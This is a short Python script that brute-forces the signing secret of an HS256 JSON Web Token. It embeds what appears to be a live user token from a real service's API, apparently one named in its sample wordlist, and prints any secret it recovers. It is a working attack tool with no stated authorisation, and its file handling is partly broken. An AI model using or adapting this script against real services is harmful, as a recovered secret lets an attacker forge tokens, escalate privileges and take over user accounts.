import jwt
from jwt import InvalidSignatureError
import itertools

# Example token (from your API, replace it here)
token = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMzcwMDY0IiwiYXV0aCI6W3siYXV0aG9yaXR5IjoiUk9MRV9VU0VSIn1dLCJidXNpbmVzc0lkIjoxLCJhcHBJZCI6NCwicm9sZV90eXBlIjoiUk9MRV9VU0VSIiwiaWQiOjEzNzAwNjQsImlzTGl2ZSI6dHJ1ZSwiaWF0IjoxNzQ0NDkwODYxLCJleHAiOjIwNTk4NTA4NjF9.Tu2cDEZQ1ohzMSWlHWPU3JNUlfCk8W2dBhk-zVToYdI'

# Common weak passwords to try
# wordlist = ['secret', 'password', '123456', 'astrotalk', 'jwtsecret', 'admin', '1234567890', 'paaswd', 'admin@2255', '']

try:
    with open('wordlist.txt', 'rU') as infile:
        wordlist = set(line.strip() for line in infile)
except IOError:
        print(f"error opening file")
       
print('in')
for secret in wordlist:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+++++] Found secret key: {secret}")
        print(f"[+] Payload: {decoded}")
        break
    except InvalidSignatureError:
        print(f"[-] Tried '{secret}' — invalid")
    except Exception as e:
        print(f"[-] Error with '{secret}': {e}")
